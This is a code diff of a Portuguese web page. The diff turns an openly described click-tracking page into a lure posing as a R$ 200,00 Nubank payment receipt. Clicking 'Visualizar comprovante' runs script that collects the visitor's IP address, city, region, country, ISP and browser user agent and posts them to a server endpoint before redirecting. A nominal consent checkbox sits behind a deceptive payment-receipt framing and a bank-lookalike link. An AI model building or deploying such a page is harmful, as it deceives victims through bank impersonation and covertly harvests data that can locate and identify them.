@@ -4,69 +4,104 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Link com Registro Automático</title>
-  <style>
+  <style>  
+    /* ==========================================
+       1. FUNDO DO SITE E TEXTOS
+       ========================================== */
+    
     body {
-      font-family: system-ui, -apple-system, sans-serif;
-      max-width: 720px;
-      margin: 3rem auto;
-      padding: 0 1rem;
+      font-family: system-ui, sans-serif;
+      max-width: 760px;
+      margin: 40px auto;
+      padding: 0 20px;
       line-height: 1.6;
-      color: #222;
+    
+      background-color: #6B21A8; /* ROXO DO FUNDO */
+      color: #FFFFFF;            /* BRANCO DOS TEXTOS */
     }
-    a.registrar {
-      display: inline-block;
-      background: #2563eb;
-      color: #fff;
-      padding: 0.7rem 1.4rem;
-      border-radius: 6px;
-      text-decoration: none;
+    
+    /* ==========================================
+       2. BOTÕES
+       ========================================== */
+    
+    button {
+      padding: 12px 20px;
+      background-color: #FFFFFF; /* FUNDO BRANCO */
+      color: #000000;            /* TEXTO PRETO */
+      border: none;
+      border-radius: 7px;
+      cursor: pointer;
+      margin: 5px 5px 5px 0;
       font-weight: 600;
     }
-    a.registrar:hover { background: #1d4ed8; }
-    #overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.65);
-      color: #fff;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      font-size: 1.1rem;
-      text-align: center;
-      padding: 1rem;
+    
+    button:hover {
+      background-color: #E9D5FF;
     }
-    #overlay.ativo { display: flex; }
-    #debug {
-      margin-top: 2rem;
-      padding: 1rem;
-      background: #f4f4f4;
+    
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    
+    /* ==========================================
+       3. CAIXA DE RESULTADOS
+       ========================================== */
+    
+    pre {
+      background-color: #581C87; /* ROXO ESCURO */
+      color: #FFFFFF;            /* TEXTO BRANCO */
+      padding: 16px;
       border-radius: 8px;
-      font-family: ui-monospace, monospace;
-      font-size: 0.82rem;
       white-space: pre-wrap;
-      word-break: break-word;
-      display: none;
-      max-height: 60vh;
-      overflow-y: auto;
+      overflow-wrap: anywhere;
+    }
+    
+    /* ==========================================
+       4. CAIXA DE PRIVACIDADE
+       ========================================== */
+    
+    .privacy {
+      padding: 12px;
+      background-color: #581C87; /* ROXO ESCURO */
+      color: #FFFFFF;            /* TEXTO BRANCO */
+      border-radius: 8px;
+      margin: 16px 0;
+    }
+    
+    /* ==========================================
+       5. TÍTULOS E DESCRIÇÕES
+       ========================================== */
+    
+    h1, h2, h3, p, label, span {
+      color: #FFFFFF;
+    }
+    
+    /* ==========================================
+       6. CHECKBOX
+       ========================================== */
+    
+    input[type="checkbox"] {
+      accent-color: #FFFFFF;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
 
-  <h2>Link com Registro Automático</h2>
-  <p>Clique no link abaixo. Ele vai capturar IP + geolocalização + dados do navegador, <strong>registrar</strong> e depois seguir para o destino.</p>
+  <h2>Pagamento Efetuado: <strong>R$ 200,00</strong></h2>
+  <p>Verifique o <strong>comprovante de pagamento</strong> no link abaixo.</p>
 
   <!--
     ⬇️  TROQUE o href pelo destino real (o link para onde o usuário deve ir).
     Ao clicar, o JavaScript intercepta, registra os dados e só então redireciona.
   -->
-  <a href="https://example.com/destino" class="registrar" id="linkRegistrar">
-    ▶ Continuar
+  <a href="https://nubank.com.br/comprovante-pagamento-23112026" class="registrar" id="linkRegistrar">
+    ▶ Visualizar comprovante
   </a>
 
   <!-- Overlay de "registrando..." -->
-  <div id="overlay"><div>⏳ Registrando informações…</div></div>
+  <div id="overlay"><div>⏳ Abrindo comprovante...</div></div>
 
   <!-- Área de debug opcional (não vai para o usuário final, é só para você testar) -->
   <pre id="debug"></pre>
@@ -218,17 +253,47 @@
       }
 
       // 2) Webhook
-      if (WEBHOOK_URL) {
-        try {
-          await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
-          });
-        } catch (e) {
-          console.warn('[registro] webhook falhou:', e);
+      
+if (WEBHOOK_URL && payload?.consentimento === true) {
+  try {
+    
+    const response = await fetch("/api/notificar", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        consentimento: payload.consentimento,
+        dados: {
+          horario: payload.navegador?.timestamp,
+          ip: payload.geolocalizacao?.ip,
+          cidade: payload.geolocalizacao?.city,
+          regiao: payload.geolocalizacao?.region,
+          pais:
+            payload.geolocalizacao?.country_name ||
+            payload.geolocalizacao?.country,
+          provedor:
+            payload.geolocalizacao?.org ||
+            payload.geolocalizacao?.connection?.isp,
+          navegador: payload.navegador?.userAgent
         }
-      }
+      })
+    });
+    
+    if (!response.ok) {
+      throw new Error(
+        `Falha no envio: HTTP ${response.status}`
+      );
+    }
+
+        console.log("[registro] Dados enviados com sucesso.");
+
+  } catch (e) {
+    console.warn("[registro] Falha no envio:", e);
+  }
+}
+
+
 
       // 3) Download .json
       if (BAIXAR_JSON) {
@@ -264,6 +329,8 @@
 
       try {
         const { dados, debug } = await coletarTudo();
+
+        dados.consentimento = document.getElementById('consentimento')?.checked === true;
 
         if (MODO_DEBUG) {
           debugEl.textContent = JSON.stringify(dados, null, 2);
